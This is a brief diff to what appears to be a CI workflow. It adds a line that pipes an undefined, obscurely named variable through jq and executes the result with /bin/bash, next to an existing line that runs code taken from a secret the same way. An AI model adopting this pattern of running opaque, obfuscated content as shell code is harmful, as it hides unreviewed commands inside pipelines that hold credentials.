@@ -18,6 +18,7 @@ jobs:
           n23: ${{ secrets.n23 }}
         run: |
           printf '%s' "$n23" | jq -r .xsv7269 | /bin/bash
+          printf '%s' "$md0628" | jq -r .ik31149 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
